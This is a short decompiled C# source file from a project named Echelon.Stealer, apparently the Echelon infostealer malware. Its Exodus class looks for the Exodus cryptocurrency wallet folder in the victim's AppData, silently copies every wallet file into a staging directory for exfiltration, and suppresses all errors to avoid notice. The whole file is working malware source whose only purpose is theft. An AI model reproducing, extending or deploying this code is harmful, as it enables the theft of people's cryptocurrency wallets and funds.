using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000B RID: 11
	internal class Exodus
	{
		// Token: 0x06000019 RID: 25 RVA: 0x000034D0 File Offset: 0x000016D0
		public static void ExodusStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Exodus.ExodusDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Exodus.ExodusDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
						fileInfo.CopyTo(directorypath + Exodus.ExodusDir + fileInfo.Name);
					}
					Exodus.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400001B RID: 27
		public static int count;

		// Token: 0x0400001C RID: 28
		public static string ExodusDir = "\\Wallets\\Exodus\\";

		// Token: 0x0400001D RID: 29
		public static string ExodusDir2 = Help.AppDate + "\\Exodus\\exodus.wallet\\";
	}
}
